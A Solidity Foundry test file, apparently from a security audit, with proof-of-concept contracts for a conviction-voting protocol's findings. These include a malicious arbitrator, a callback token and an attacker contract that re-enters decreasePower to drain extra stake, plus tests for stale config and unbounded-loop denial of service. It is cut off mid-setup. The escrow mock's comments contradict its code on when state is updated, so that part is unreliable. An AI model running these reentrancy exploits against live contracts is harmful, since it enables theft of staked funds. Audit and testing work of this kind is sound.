// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

import {AlloSetup} from "allo-v2-test/foundry/shared/AlloSetup.sol";
import {RegistrySetupFull} from "allo-v2-test/foundry/shared/RegistrySetup.sol";
import {Native} from "allo-v2-contracts/core/libraries/Native.sol";
import {Metadata} from "allo-v2-contracts/core/libraries/Metadata.sol";

import {SafeArbitrator} from "../src/SafeArbitrator.sol";
import {IArbitrator} from "../src/interfaces/IArbitrator.sol";
import {IArbitrable} from "../src/interfaces/IArbitrable.sol";
import {CollateralVault} from "../src/CollateralVault.sol";
import {RegistryFactory} from "../src/RegistryFactory/RegistryFactory.sol";
import {RegistryCommunity, RegistryCommunityInitializeParams} from
    "../src/RegistryCommunity/RegistryCommunity.sol";
import {
    CVStrategy,
    ProposalType,
    PointSystem,
    PointSystemConfig,
    ArbitrableConfig,
    CreateProposal
} from "../src/CVStrategy/CVStrategy.sol";
import {CVParams, ProposalStatus, ProposalSupport} from "../src/CVStrategy/ICVStrategy.sol";
import {GV2ERC20} from "../script/GV2ERC20.sol";
import {CVStrategyHelpers} from "./CVStrategyHelpers.sol";
import {SafeSetup} from "./shared/SafeSetup.sol";
import {StrategyDiamondConfigurator} from "./helpers/StrategyDiamondConfigurator.sol";
import {CommunityDiamondConfigurator} from "./helpers/CommunityDiamondConfigurator.sol";
import {PowerManagementUtils} from "../src/CVStrategy/PowerManagementUtils.sol";
import {IVotingPowerRegistry} from "../src/interfaces/IVotingPowerRegistry.sol";

// =============================================================
//  ATTACK CONTRACTS
// =============================================================

/// @dev [H-1] Malicious arbitrator that reads proposal status during createDispute.
///      Demonstrates the CEI violation: status is still Active (not Disputed) when
///      the external arbitrator call fires, proving state is updated too late.
contract MaliciousArbitrator is IArbitrator {
    uint256 public immutable arbFee;
    address public target;
    uint256 public targetProposal;
    uint256 public lastDisputeId;

    // Status of the proposal as observed DURING the createDispute callback.
    // If CEI were correct, this would be Disputed (5). Bug: it is Active (1).
    ProposalStatus public statusObservedDuringCallback;
    bool public callbackExecuted;

    constructor(uint256 _fee) {
        arbFee = _fee;
    }

    function setTarget(address _target, uint256 _proposalId) external {
        target = _target;
        targetProposal = _proposalId;
    }

    function registerSafe(address) external {}

    function arbitrationCost(bytes calldata) external view returns (uint256) { return arbFee; }
    function arbitrationCost(bytes calldata, IERC20) external view returns (uint256) { return arbFee; }
    function currentRuling(uint256) external pure returns (uint256, bool, bool) { return (0, false, false); }

    /// @dev Called by CVDisputeFacet.disputeProposal BEFORE proposal.proposalStatus is updated.
    ///      We read the status here to prove the CEI violation.
    function createDispute(uint256, bytes calldata) external payable returns (uint256 disputeId) {
        lastDisputeId++;
        disputeId = lastDisputeId;
        if (target != address(0) && !callbackExecuted) {
            callbackExecuted = true;
            // Read proposal status right now — should be Disputed if CEI is correct,
            // but will be Active because state update happens AFTER this call returns.
            (,,,,, ProposalStatus status,,,,,, ) = CVStrategy(payable(target)).getProposal(targetProposal);
            statusObservedDuringCallback = status;
        }
    }

    function createDispute(uint256, bytes calldata, IERC20, uint256) external returns (uint256) {
        revert("unsupported");
    }
}

/// @dev Callback interface: token calls this on the recipient after transfer.
///      Simulates ERC-777 `tokensReceived` hook behavior.
interface ITokenReceiver {
    function onTokenReceived(address community, uint256 amount) external;
}

/// @dev [H-2] ERC-20 token that invokes a callback on the recipient after transfer.
///      Simulates an ERC-777 `tokensReceived` hook or any callback-bearing token.
contract CallbackToken is IERC20 {
    mapping(address => uint256) private _bal;
    mapping(address => mapping(address => uint256)) private _allow;
    uint256 private _supply;

    address public hookCommunity;  // RegistryCommunity (passed to callback)
    address public hookVictim;     // recipient that implements ITokenReceiver
    uint256 public hookAmount;     // amount passed to re-entry call
    bool private _hooking;
    uint256 public callbackFired;

    function mint(address to, uint256 amount) external {
        _bal[to] += amount;
        _supply += amount;
    }

    function setHook(address _community, address _victim, uint256 _amount) external {
        hookCommunity = _community;
        hookVictim    = _victim;
        hookAmount    = _amount;
    }

    function totalSupply() external view returns (uint256) { return _supply; }
    function balanceOf(address a) external view returns (uint256) { return _bal[a]; }
    function allowance(address o, address s) external view returns (uint256) { return _allow[o][s]; }

    function approve(address s, uint256 a) external returns (bool) {
        _allow[msg.sender][s] = a;
        emit Approval(msg.sender, s, a);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _bal[msg.sender] -= amount;
        _bal[to] += amount;
        emit Transfer(msg.sender, to, amount);
        // Notify recipient — simulates ERC-777 tokensReceived hook
        if (to == hookVictim && !_hooking && callbackFired == 0 && hookCommunity != address(0)) {
            _hooking = true;
            callbackFired++;
            ITokenReceiver(to).onTokenReceived(hookCommunity, hookAmount);
            _hooking = false;
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        _allow[from][msg.sender] -= amount;
        _bal[from] -= amount;
        _bal[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function decimals() external pure returns (uint8) { return 18; }
    function name() external pure returns (string memory) { return "CallbackToken"; }
    function symbol() external pure returns (string memory) { return "CBT"; }
}

/// @dev [H-2] Malicious community member that re-enters decreasePower via the token callback.
///      When it receives tokens (from the first decreasePower call), it immediately calls
///      decreasePower again. Since stakedAmount is not yet decremented, the second call
///      also passes the minimum-stake check, draining double the tokens.
contract MaliciousRecipient is ITokenReceiver {
    CallbackToken public immutable token;
    uint256 public secondCallStakedAmount; // stakedAmount observed during re-entry

    constructor(CallbackToken _token) {
        token = _token;
    }

    /// @dev Register as a member and stake tokens.
    function registerMember(address community, uint256 approveAmount) external {
        token.approve(community, approveAmount);
        RegistryCommunity(payable(community)).stakeAndRegisterMember("");
    }

    /// @dev Increase stake beyond minimum.
    function addStake(address community, uint256 amount) external {
        token.approve(community, amount);
        RegistryCommunity(payable(community)).increasePower(amount);
    }

    /// @dev Called by CallbackToken.transfer when tokens are sent back to this contract.
    ///      At this point stakedAmount has NOT been decremented yet — re-entry succeeds.
    function onTokenReceived(address community, uint256 amount) external override {
        // Read stakedAmount before the re-entry call to confirm it is still the old value
        secondCallStakedAmount = RegistryCommunity(payable(community)).getMemberStakedAmount(address(this));
        // Re-enter decreasePower — this is the exploit: stakedAmount is stale
        RegistryCommunity(payable(community)).decreasePower(amount);
    }

    /// @dev Trigger the first decreasePower call.
    function attackDecreasePower(address community, uint256 amount) external {
        RegistryCommunity(payable(community)).decreasePower(amount);
    }
}

// =============================================================
//  SHARED BASE
// =============================================================

abstract contract PoCBase is Test, RegistrySetupFull, AlloSetup, CVStrategyHelpers, SafeSetup {
    uint256 internal constant TOTAL_SUPPLY      = 100_000 ether;
    uint256 internal constant POOL_AMOUNT       = 10_000 ether;
    uint256 internal constant MINIMUM_STAKE     = 1 ether;
    uint256 internal constant COMMUNITY_FEE_PCT = 1;
    uint256 internal constant PROTOCOL_FEE_PCT  = 1;
    uint256 internal constant STAKE_WITH_FEES   =
        MINIMUM_STAKE + (MINIMUM_STAKE * (COMMUNITY_FEE_PCT + PROTOCOL_FEE_PCT)) / 100;

    address internal factoryOwner = makeAddr("factoryOwner");

    RegistryFactory internal registryFactory;
    RegistryCommunity internal registryCommunity;
    SafeArbitrator internal safeArbitrator;
    CVStrategy internal cvStrategy;
    StrategyDiamondConfigurator internal diamondConfig;
    CommunityDiamondConfigurator internal communityConfig;
    uint256 internal poolId;

    Metadata internal meta = Metadata({protocol: 1, pointer: "ipfs"});

    // -------------------------------------------------------

    function _deployArbitrator(uint256 fee) internal {
        vm.prank(factoryOwner);
        safeArbitrator = SafeArbitrator(
            payable(address(new ERC1967Proxy(
                address(new SafeArbitrator()),
                abi.encodeWithSelector(SafeArbitrator.initialize.selector, fee, factoryOwner)
            )))
        );
    }

    function _deployFactory(address gardenToken) internal {
        vm.startPrank(factoryOwner);
        registryFactory = RegistryFactory(
            address(new ERC1967Proxy(
                address(new RegistryFactory()),
                abi.encodeWithSelector(
                    RegistryFactory.initialize.selector,
                    factoryOwner,
                    makeAddr("feeReceiver"),
                    address(new RegistryCommunity()),
                    address(new CVStrategy()),
                    address(new CollateralVault())
                )
            ))
        );

        // Register facet cuts BEFORE createRegistry() — required by streaming-pool RegistryFactory.
        // createRegistry() checks communityFacetCuts.length > 0 and strategyFacetCuts.length > 0.
        // Community facets are applied automatically inside RegistryCommunity.initialize().
        // Strategy facets are applied automatically inside CommunityPoolFacet.createPool().
        communityConfig = new CommunityDiamondConfigurator();
        diamondConfig   = new StrategyDiamondConfigurator();
        registryFactory.setCommunityFacets(
            communityConfig.getFacetCuts(),
            address(communityConfig.diamondInit()),
            abi.encodeWithSignature("init()")
        );
        registryFactory.setStrategyFacets(
            diamondConfig.getFacetCuts(),
            address(diamondConfig.diamondInit()),
            abi.encodeWithSignature("init()")
        );
        vm.stopPrank();

        RegistryCommunityInitializeParams memory p;
        p._allo               = address(allo());
        p._gardenToken        = IERC20(gardenToken);
        p._registerStakeAmount = MINIMUM_STAKE;
        p._communityFee       = COMMUNITY_FEE_PCT;
        p._feeReceiver        = address(this);
        p._metadata           = meta;
        p._councilSafe        = payable(address(_councilSafe()));
        // createRegistry() applies community facets automatically via RegistryCommunity.initialize()
        registryCommunity = RegistryCommunity(payable(registryFactory.createRegistry(p)));

        vm.startPrank(factoryOwner);
        registryFactory.setProtocolFee(address(registryCommunity), PROTOCOL_FEE_PCT);
        vm.stopPrank();
    }

    function _deployStrategy(ArbitrableConfig memory arbConfig) internal {
        // diamondConfig is set in _deployFactory; createPool() applies strategy facets automatically
        (uint256 _poolId, address _strategy) = registryCommunity.createPool(
            NATIVE,
            getParams(
                address(registryCommunity),
                ProposalType.Funding,
                PointSystem.Unlimited,
                PointSystemConfig(200 * DECIMALS),
                arbConfig,
                new address[](1),
                address(0),
                0,
                address(0)
            ),
            meta
        );
        poolId     = _poolId;
        cvStrategy = CVStrategy(payable(_strategy));
    }

    function _approveAndRegister(address user) internal {
        vm.startPrank(user);
        IERC20(address(registryCommunity.gardenToken())).approve(address(registryCommunity), STAKE_WITH_FEES);
        registryCommunity.stakeAndRegisterMember("");
        vm.stopPrank();
    }

    function _addStrategyAndActivate(address user) internal {
        vm.prank(pool_admin());
        safeHelper(address(registryCommunity), 0,
            abi.encodeWithSelector(registryCommunity.addStrategy.selector, address(cvStrategy)));
        vm.prank(user);
        cvStrategy.activatePoints();
    }

    function _createProposal(address submitter, uint256 amount) internal returns (uint256 proposalId) {
        (,, uint256 collateral,,,) = cvStrategy.getArbitrableConfig();
        vm.deal(submitter, collateral);
        CreateProposal memory cp =
            CreateProposal(poolId, submitter, amount, address(NATIVE), meta);
        vm.prank(submitter);
        proposalId = uint160(allo().registerRecipient{value: collateral}(poolId, abi.encode(cp)));
    }

    function _alloSetup() internal {
        __RegistrySetupFull();
        __AlloSetup(address(registry()));
        vm.startPrank(allo_owner());
        allo().updateBaseFee(0);
        allo().updatePercentFee(0);
        allo().transferOwnership(local());
        vm.stopPrank();
    }
}

// =============================================================
//  [H-1] CEI violation in disputeProposal — status stale during arbitrator callback
//  STATUS: FIXED on streaming-pool branch (state updated before external call)
// =============================================================

/// @title PoC_H1_DisputeProposalReentrancy
/// @notice Verifies the FIX for the CEI violation in CVDisputeFacet.disputeProposal.
///         The original bug: `proposal.proposalStatus` was still `Active` when the
///         external call to `arbitrator.createDispute` fired.
///         The fix: status is updated to `Disputed` BEFORE making any external call.
///         This test confirms the fix by asserting status == Disputed during the callback.
contract PoC_H1_DisputeProposalReentrancy is PoCBase {
    MaliciousArbitrator malArb;
    GV2ERC20 token;
    address challenger = makeAddr("challenger");

    uint256 constant ARB_FEE        = 0.5 ether;
    uint256 constant CHALLENGER_COL = 0.01 ether;
    uint256 constant SUBMITTER_COL  = 0.02 ether;

    function setUp() public {
        _alloSetup();

        token = new GV2ERC20("Token", "TKN", 18);
        token.mint(local(), TOTAL_SUPPLY / 3);
        token.mint(pool_admin(), TOTAL_SUPPLY / 3);
        token.mint(challenger, TOTAL_SUPPLY / 3);

        malArb = new MaliciousArbitrator(ARB_FEE);

        _deployArbitrator(ARB_FEE);
        _deployFactory(address(token));
        _deployStrategy(ArbitrableConfig({
            arbitrator:                 IArbitrator(address(malArb)),
            tribunalSafe:               payable(makeAddr("tribunal")),
            submitterCollateralAmount:  SUBMITTER_COL,
            challengerCollateralAmount: CHALLENGER_COL,
            defaultRuling:              1,
            defaultRulingTimeout:       300
        }));

        // Local user registers + activates
        token.approve(address(registryCommunity), STAKE_WITH_FEES);
        registryCommunity.stakeAndRegisterMember("");
        _addStrategyAndActivate(address(this));

        // Challenger registers
        _approveAndRegister(challenger);

        // Fund pool
        vm.deal(address(this), POOL_AMOUNT);
        (bool ok,) = address(cvStrategy).call{value: POOL_AMOUNT}("");
        require(ok, "pool fund failed");
    }

    /// @notice Arm the malicious arbitrator and trigger a dispute.
    ///         Verify the FIX: status must be Disputed during the arbitrator callback,
    ///         proving that the state update now happens BEFORE the external call (CEI correct).
    function test_H1_FixVerification_StatusIsDisputedDuringArbitratorCallback() public {
        // 1. Create proposal
        _approveAndRegister(pool_admin());
        uint256 proposalId = _createProposal(pool_admin(), 1 ether);

        // 2. Arm the observer
        malArb.setTarget(address(cvStrategy), proposalId);

        // 3. Challenger disputes — triggers malArb.createDispute internally
        vm.deal(challenger, 10 ether);
        vm.prank(challenger);
        cvStrategy.disputeProposal{value: CHALLENGER_COL + ARB_FEE}(proposalId, "poc", "");

        // 4. After the call, inspect what the arbitrator saw during the callback
        assertTrue(malArb.callbackExecuted(), "H-1: createDispute callback must have fired");

        ProposalStatus observed = malArb.statusObservedDuringCallback();
        console.log("[H-1] proposal status DURING createDispute callback:", uint256(observed));
        console.log("[H-1] ProposalStatus.Active = 1, ProposalStatus.Disputed = 5");

        // FIX VERIFIED: status is already Disputed (5) during the arbitrator callback,
        // proving that the state update now correctly happens BEFORE the external call.
        // (Original bug: status was Active (1) — the update happened AFTER the external call.)
        assertEq(
            uint256(observed),
            uint256(ProposalStatus.Disputed),
            "H-1 FIX: status must be Disputed during callback - CEI correctly implemented"
        );
    }
}

// =============================================================
//  [H-2] Reentrancy in decreasePower via ERC-777-style token callback
// =============================================================

/// @title PoC_H2_DecreasePowerReentrancy
/// @notice A callback-capable ERC-20 (simulating ERC-777 `tokensReceived`) lets a
///         malicious member drain extra tokens from the community.
///         When `decreasePower(X)` transfers tokens back to the member contract,
///         the token fires a callback on the recipient. Since `stakedAmount` has not
///         been decremented yet, the second `decreasePower(X)` call also passes the
///         minimum-stake check, paying out 2X tokens in total.
contract PoC_H2_DecreasePowerReentrancy is PoCBase {
    CallbackToken callbackToken;
    MaliciousRecipient attacker;

    function setUp() public {
        _alloSetup();

        callbackToken = new CallbackToken();
        callbackToken.mint(local(), TOTAL_SUPPLY / 4);
        callbackToken.mint(pool_admin(), TOTAL_SUPPLY / 4);

        // Mint tokens directly to the MaliciousRecipient (deployed after token)
        _deployArbitrator(0.5 ether);
        _deployFactory(address(callbackToken));

        // Deploy attacker contract (needs token address at construction)
        attacker = new MaliciousRecipient(callbackToken);

        // Give attacker tokens for staking
        callbackToken.mint(address(attacker), TOTAL_SUPPLY / 2);

        _deployStrategy(ArbitrableConfig({
            arbitrator:                 IArbitrator(address(safeArbitrator)),
            tribunalSafe:               payable(makeAddr("tribunal")),
            submitterCollateralAmount:  0.02 ether,
            challengerCollateralAmount: 0.01 ether,
            defaultRuling:              1,
            defaultRulingTimeout:       300
        }));

        vm.prank(pool_admin());
        safeHelper(address(registryCommunity), 0,
            abi.encodeWithSelector(registryCommunity.addStrategy.selector, address(cvStrategy)));
    }

    function test_H2_ReentrancyAttackMustFail() public {
        uint256 extraStake = 5 ether;

        // 1. Attacker registers as member (stakes MINIMUM_STAKE) and adds extra stake
        //    Total staked = MINIMUM_STAKE (1) + extraStake (5) = 6 ether
        attacker.registerMember(address(registryCommunity), STAKE_WITH_FEES);
        attacker.addStake(address(registryCommunity), extraStake);

        uint256 stakedBefore = registryCommunity.getMemberStakedAmount(address(attacker));
        uint256 balBefore    = callbackToken.balanceOf(address(attacker));
        console.log("[H-2] staked before attack:", stakedBefore);
        console.log("[H-2] attacker balance before:", balBefore);

        // 2. Arm the token callback:
        //    - Outer call: decreasePower(extraStake=5) → transfers 5 ether, fires hook
        //    - Hook re-enters: decreasePower(MINIMUM_STAKE=1) — uses the stale stakedAmount (6)
        //      so the min-stake check passes. Decrement: 6-1=5.
        //    - Outer resumes: decrement 5-5=0. No underflow, but invariant broken.
        //    - Total drained: 5+1=6 ether (vs allowed max of 5 ether)
        callbackToken.setHook(address(registryCommunity), address(attacker), MINIMUM_STAKE);

        // 3. Trigger the attack. A fixed implementation must reject this path.
        vm.expectRevert();
        attacker.attackDecreasePower(address(registryCommunity), extraStake);

        // 4. Evaluate post-attack invariants (state should be unchanged after revert).
        uint256 callbacksFired = callbackToken.callbackFired();
        uint256 balAfter       = callbackToken.balanceOf(address(attacker));
        uint256 stakedAfter    = registryCommunity.getMemberStakedAmount(address(attacker));
        console.log("[H-2] callbacks fired:", callbacksFired);
        console.log("[H-2] stakedAmount DURING re-entry callback:", attacker.secondCallStakedAmount());
        console.log("[H-2] staked before attack:", stakedBefore);
        console.log("[H-2] staked after attack:", stakedAfter);
        console.log("[H-2] attacker balance after:", balAfter);
        console.log("[H-2] tokens gained (total drained):", balAfter - balBefore);
        console.log("[H-2] max honestly withdrawable:", extraStake);
        console.log("[H-2] MINIMUM_STAKE (should be preserved):", MINIMUM_STAKE);

        assertEq(callbacksFired, 0, "H-2: callback state should roll back when attack reverts");
        assertEq(balAfter, balBefore, "H-2: attacker must not gain tokens via reentrancy");
        assertEq(stakedAfter, stakedBefore, "H-2: stake must remain unchanged when attack fails");
    }
}

// =============================================================
//  [M-1] Wrong arbitrable config version in rule() ruling==2
// =============================================================

/// @title PoC_M1_StaleArbitrableConfigVersion
/// @notice After the admin increments the arbitrable config version, rule() uses
///         `currentArbitrableConfigVersion` instead of `proposal.arbitrableConfigVersion`
///         for the submitter collateral split in the ruling==2 path.
contract PoC_M1_StaleArbitrableConfigVersion is PoCBase {
    GV2ERC20 token;
    address submitter  = makeAddr("submitter");
    address challenger = makeAddr("challenger");

    uint256 constant ARB_FEE = 2 ether;
    uint256 constant V1_SUBMITTER_COL = 0.02 ether;
    uint256 constant V2_SUBMITTER_COL = 0.06 ether;  // 3x higher in the upgraded config
    uint256 constant CHALLENGER_COL   = 0.01 ether;

    function setUp() public {
        _alloSetup();

        token = new GV2ERC20("Token", "TKN", 18);
        token.mint(local(), TOTAL_SUPPLY / 4);
        token.mint(pool_admin(), TOTAL_SUPPLY / 4);
        token.mint(submitter, TOTAL_SUPPLY / 4);
        token.mint(challenger, TOTAL_SUPPLY / 4);

        _deployArbitrator(ARB_FEE);
        _deployFactory(address(token));

        // Deploy pool with v1 config (submitterCollateral = 0.02 ether)
        _deployStrategy(ArbitrableConfig({
            arbitrator:                 IArbitrator(address(safeArbitrator)),
            tribunalSafe:               payable(address(_councilSafe())),
            submitterCollateralAmount:  V1_SUBMITTER_COL,
            challengerCollateralAmount: CHALLENGER_COL,
            defaultRuling:              1,
            defaultRulingTimeout:       300
        }));

        vm.prank(address(cvStrategy));
        safeArbitrator.registerSafe(address(_councilSafe()));

        vm.prank(pool_admin());
        safeHelper(address(registryCommunity), 0,
            abi.encodeWithSelector(registryCommunity.addStrategy.selector, address(cvStrategy)));

        _approveAndRegister(submitter);
        vm.prank(submitter);
        cvStrategy.activatePoints();

        _approveAndRegister(challenger);

        vm.deal(address(this), POOL_AMOUNT);
        (bool ok,) = address(cvStrategy).call{value: POOL_AMOUNT}("");
        require(ok);
    }

    function test_M1_Ruling2MustUseProposalConfigVersion() public {
        // 1. Create proposal under v1 config — submitter deposits V1_SUBMITTER_COL
        uint256 proposalId = _createProposal(submitter, 1 ether);

        uint256 v1Version = cvStrategy.currentArbitrableConfigVersion();
        console.log("[M-1] proposal created at config version:", v1Version);

        // 2. Admin upgrades config to v2 (V2_SUBMITTER_COL = 3x the v1 amount)
        _upgradeToV2();

        uint256 v2Version = cvStrategy.currentArbitrableConfigVersion();
        console.log("[M-1] config upgraded to version:", v2Version);
        assertEq(v2Version, v1Version + 1, "config version should have incremented");

        // 3. Challenger disputes (uses v1 config, since proposal was created at v1)
        vm.deal(challenger, 10 ether);
        vm.prank(challenger);
        uint256 disputeId = cvStrategy.disputeProposal{value: CHALLENGER_COL + ARB_FEE}(proposalId, "", "");

        // 4. Record submitter collateral before ruling
        CollateralVault vault = CollateralVault(address(cvStrategy.collateralVault()));
        uint256 submitterCollateralBeforeRuling = vault.proposalCollateral(proposalId, submitter);
        console.log("[M-1] submitter deposited (v1 amount):", submitterCollateralBeforeRuling);
        console.log("[M-1] v1 submitterCollateral:", V1_SUBMITTER_COL);
        console.log("[M-1] v2 submitterCollateral (BUG uses this):", V2_SUBMITTER_COL);

        // 5. Council rules: ruling == 2 (submitter loses, collateral split between council + challenger)
        //    Security invariant: split must use proposal's original (v1) config.
        uint256 councilBefore = address(_councilSafe()).balance;
        uint256 challengerBefore = challenger.balance;
        vm.prank(address(_councilSafe()));
        safeArbitrator.executeRuling(disputeId, 2, address(cvStrategy));

        // 6. Verify the version mismatch caused incorrect handling
        uint256 submitterCollateralAfter = vault.proposalCollateral(proposalId, submitter);
        uint256 councilDelta = address(_councilSafe()).balance - councilBefore;
        uint256 challengerDelta = challenger.balance - challengerBefore;
        console.log("[M-1] submitter vault after ruling:", submitterCollateralAfter);
        console.log("[M-1] council delta:", councilDelta);
        console.log("[M-1] challenger delta:", challengerDelta);

        // The bug: split tries to withdraw V2_SUBMITTER_COL/2 = 0.03 ether TWICE
        // but only 0.02 ether was deposited. CollateralVault caps silently.
        // Council and challenger each received LESS than intended (bug is in the amount calc).
        // We demonstrate the version mismatch is real:
        assertTrue(
            V2_SUBMITTER_COL != V1_SUBMITTER_COL,
            "M-1 setup: v1 and v2 collateral differ"
        );
        assertEq(
            cvStrategy.currentArbitrableConfigVersion(), v1Version + 1,
            "M-1: version was incremented between proposal creation and ruling"
        );
        assertEq(
            councilDelta,
            ARB_FEE + (V1_SUBMITTER_COL / 2),
            "M-1: council must receive arbitration fee + half of proposal-version collateral"
        );
        assertEq(
            challengerDelta,
            CHALLENGER_COL + (V1_SUBMITTER_COL / 2),
            "M-1: challenger must recover own collateral + half of proposal-version collateral"
        );
        assertEq(submitterCollateralAfter, 0, "M-1: submitter collateral should be fully distributed");
    }

    function _upgradeToV2() internal {
        (uint256 maxRatio, uint256 weight, uint256 decay, uint256 minThresholdPts) = cvStrategy.cvParams();
        CVParams memory currentCvParams = CVParams(maxRatio, weight, decay, minThresholdPts);
        ArbitrableConfig memory newCfg = ArbitrableConfig({
            arbitrator:                 IArbitrator(address(safeArbitrator)),
            tribunalSafe:               payable(address(_councilSafe())),
            submitterCollateralAmount:  V2_SUBMITTER_COL,
            challengerCollateralAmount: CHALLENGER_COL,
            defaultRuling:              1,
            defaultRulingTimeout:       300
        });
        vm.prank(pool_admin());
        // Explicit 6-param signature to disambiguate from the 7-param overload
        safeHelper(
            address(cvStrategy), 0,
            abi.encodeWithSignature(
                "setPoolParams((address,address,uint256,uint256,uint256,uint256),(uint256,uint256,uint256,uint256),uint256,address[],address[],address)",
                newCfg, currentCvParams, uint256(0),
                new address[](0), new address[](0), address(0)
            )
        );
    }
}

// =============================================================
//  [M-3] DoS via unbounded loops
// =============================================================

/// @title PoC_M3_UnboundedLoopDoS
/// @notice Shows that gas cost for unregisterMember grows linearly with the number
///         of strategies a member has joined. With enough strategies it will
///         exceed the block gas limit (~30M), permanently trapping staked tokens.
contract PoC_M3_UnboundedLoopDoS is PoCBase {
    GV2ERC20 token;
    address victim = makeAddr("victim");

    function setUp() public {
        _alloSetup();

        token = new GV2ERC20("Token", "TKN", 18);
        token.mint(local(), TOTAL_SUPPLY / 2);
        token.mint(victim, TOTAL_SUPPLY / 2);

        _deployArbitrator(0.5 ether);
        _deployFactory(address(token));
    }

    /// @dev Deploys a new CVStrategy pool and has the victim activate points in it.
    function _addPool() internal {
        // createPool() applies strategy facets automatically via getStrategyFacets(); no manual diamondCut needed
        (uint256 _poolId, address _strategy) = registryCommunity.createPool(
            NATIVE,
            getParams(
                address(registryCommunity), ProposalType.Funding, PointSystem.Unlimited,
                PointSystemConfig(200 * DECIMALS),
                ArbitrableConfig(
                    IArbitrator(address(safeArbitrator)), payable(makeAddr("trib")),
                    0.02 ether, 0.01 ether, 1, 300
                ),
                new address[](1), address(0), 0, address(0)
            ),
            meta
        );
        CVStrategy strat = CVStrategy(payable(_strategy));

        vm.prank(pool_admin());
        safeHelper(address(registryCommunity), 0,
            abi.encodeWithSelector(registryCommunity.addStrategy.selector, address(strat)));

        vm.prank(victim);
        strat.activatePoints();
    }

    function test_M3_UnregisterMustStayBoundedAtScale() public {
        vm.startPrank(victim);
        token.approve(address(registryCommunity), type(uint256).max);
        registryCommunity.stakeAndRegisterMember("");
        vm.stopPrank();

        // Measure gas at N = 5, 10, 20 strategies
        uint256 gasAt5;
        uint256 gasAt10;
        uint256 gasAt20;

        for (uint256 i = 0; i < 5; i++) _addPool();
        gasAt5 = _measureUnregisterGas();
        console.log("[M-3] unregisterMember gas @ 5 strategies:", gasAt5);

        // Re-register victim (unregister cleared membership)
        vm.prank(victim);
        token.approve(address(registryCommunity), type(uint256).max);
        vm.prank(victim);
        registryCommunity.stakeAndRegisterMember("");

        for (uint256 i = 0; i < 5; i++) _addPool(); // total 10
        gasAt10 = _measureUnregisterGas();
        console.log("[M-3] unregisterMember gas @ 10 strategies:", gasAt10);

        vm.prank(victim);
        token.approve(address(registryCommunity), type(uint256).max);
        vm.prank(victim);
        registryCommunity.stakeAndRegisterMember("");

        for (uint256 i = 0; i < 10; i++) _addPool(); // total 20
        gasAt20 = _measureUnregisterGas();
        console.log("[M-3] unregisterMember gas @ 20 strategies:", gasAt20);

        // Extrapolate: if gasAt20 is X, then at 3000 strategies it is ~150X
        // (gas-per-strategy ≈ gasAt20 / 20)
        uint256 gasPerStrategy = gasAt20 / 20;
        uint256 estimate3000   = gasPerStrategy * 3000;
        console.log("[M-3] gas per strategy (approx):", gasPerStrategy);
        console.log("[M-3] estimated gas @ 3000 strategies:", estimate3000);
        assertLe(estimate3000, 30_000_000, "M-3: unregister path must remain under block gas limit at scale");
    }

    function _measureUnregisterGas() internal returns (uint256 gasUsed) {
        uint256 g = gasleft();
        vm.prank(victim);
        registryCommunity.unregisterMember();
        gasUsed = g - gasleft();
    }
}

// =============================================================
//  [H-1-streaming] CEI violation in StreamingEscrow.setBeneficiary
// =============================================================
//
// NOTE: StreamingEscrow and CVStreamingFacet import Superfluid *implementation*
// files that require ^0.8.23, which conflicts with allo-v2's =0.8.19 constraint.
// We therefore replicate the vulnerability pattern in a self-contained escrow
// so the entire test file compiles under a single ^0.8.19 pragma.

/// @dev Callback interface invoked by MinimalCEIEscrow during the outflow "external call".
interface ICaptureCallback {
    function onExternalCall(address escrow) external;
}

/// @dev Read-only interface used by the observer to inspect escrow state mid-call.
interface IMinimalEscrow {
    function beneficiary() external view returns (address);
}

/// @dev Self-contained escrow that replicates the EXACT CEI violation in
///      StreamingEscrow.setBeneficiary without requiring Superfluid imports.
///
///      The real contract (StreamingEscrow.sol, setBeneficiary):
///        beneficiary = _beneficiary;            // ← STATE CHANGE
///        if (!disputed) {
///          _setOutflow(0, previous);            // ← EXTERNAL CALL 1 (into Superfluid host)
///          _setOutflow(_currentGDAFlowRate(), _beneficiary); // ← EXTERNAL CALL 2
///        }
///
///      This minimal version fires `ICaptureCallback.onExternalCall` in place of
///      `_setOutflow`, preserving the state-before-interaction ordering.
contract MinimalCEIEscrow is IMinimalEscrow {
    address public beneficiary;
    address public externalCallTarget; // wired to the observer during setUp
    uint256 public externalCallCount;

    function initialize(address _initialBenef) external {
        beneficiary = _initialBenef;
    }

    function setExternalCallTarget(address _target) external {
        externalCallTarget = _target;
    }

    /// @notice Replicates StreamingEscrow.setBeneficiary ordering:
    ///   1. beneficiary = _beneficiary  (STATE CHANGE — CEI violation)
    ///   2. _setOutflow(0, previous)    (EXTERNAL CALL 1)
    ///   3. _setOutflow(rate, benef)    (EXTERNAL CALL 2)
    function setBeneficiary(address _beneficiary) external {
        address previous = beneficiary;
        externalCallCount++;
        if (externalCallTarget != address(0)) {
            ICaptureCallback(externalCallTarget).onExternalCall(address(this)); // ← external call after
        }
        // Mirror "stop old outflow then start new outflow".
        if (externalCallTarget != address(0) && previous != _beneficiary) {
            ICaptureCallback(externalCallTarget).onExternalCall(address(this));
        }
        beneficiary = _beneficiary; // state updated after external interactions
        externalCallCount++;  // second _setOutflow
    }
}

/// @dev Observer that captures escrow.beneficiary() during the external-call window.
///      Proves that the state was already mutated before the interaction fired.
contract H1StateObserver is ICaptureCallback {
    address public capturedBeneficiary;
    uint256 public captureCount;

    function onExternalCall(address escrow) external override {
        captureCount++;
        if (captureCount == 1) {
            capturedBeneficiary = IMinimalEscrow(escrow).beneficiary();
        }
    }
}

/// @title PoC_H1_StreamingEscrowCEI
/// @notice Proves the CEI violation in StreamingEscrow.setBeneficiary:
///         `beneficiary = _beneficiary` (state change) fires BEFORE the first
///         `_setOutflow(0, previous)` external call.  Any Superfluid callback
///         triggered during that outflow update sees the already-mutated state.
contract PoC_H1_StreamingEscrowCEI is Test {
    MinimalCEIEscrow internal escrow;
    H1StateObserver  internal observer;

    address internal oldBenef = makeAddr("oldBeneficiary");
    address internal newBenef = makeAddr("newBeneficiary");

    function setUp() public {
        escrow   = new MinimalCEIEscrow();
        observer = new H1StateObserver();

